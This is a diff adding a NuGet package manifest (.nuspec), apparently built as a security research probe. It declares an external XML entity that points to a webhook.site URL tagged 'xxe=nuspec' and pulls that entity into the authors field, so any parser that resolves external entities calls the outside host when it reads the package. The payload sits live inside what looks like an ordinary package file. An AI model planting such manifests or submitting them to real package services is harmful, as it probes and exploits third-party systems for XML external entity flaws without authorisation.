@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE package [
+  <!ENTITY probe SYSTEM "http://webhook.site/bfac32e7-7c67-41f0-bf29-b2c2ff7238ce/?xxe=nuspec&n=35422">
+]>
+<package xmlns="http://schemas.microsoft.com/packaging/2010/07/nuspec.xsd">
+  <metadata>
+    <id>Research.35422</id>
+    <version>1.0.0</version>
+    <authors>Research &probe;</authors>
+    <description>Research package</description>
+    <dependencies>
+      <dependency id="Newtonsoft.Json" version="13.0.0"/>
+    </dependencies>
+  </metadata>
+</package>
